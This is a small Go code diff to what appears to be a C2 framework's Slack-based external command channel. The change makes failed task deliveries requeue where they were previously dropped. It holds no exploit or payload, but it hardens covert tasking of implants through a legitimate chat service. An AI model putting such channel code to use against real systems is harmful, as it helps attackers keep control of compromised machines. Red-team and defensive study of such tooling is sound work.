@@ -112,7 +112,7 @@ func (sc *SlackExternalC2) connectAndRun(channelID string) {
 			tasks := sc.server.extC2TaskQueue[channelID]
 			sc.server.extC2TaskQueue[channelID] = nil
 			sc.server.extC2TaskMu.Unlock()
-			for _, task := range tasks {
+			for i, task := range tasks {
 				taskJSON, ok := marshalJSONSafe(task)
 				if !ok {
 					continue
@@ -122,7 +122,9 @@ func (sc *SlackExternalC2) connectAndRun(channelID string) {
 					slack.MsgOptionText(string(taskJSON), false),
 				)
 				if err != nil {
-					slog.Error("Slack External C2 send failed", "error", err)
+					slog.Error("Slack External C2 send failed, requeueing", "error", err)
+					sc.server.requeueExtC2Tasks(channelID, tasks[i:])
+					break
 				}
 			}
 		}
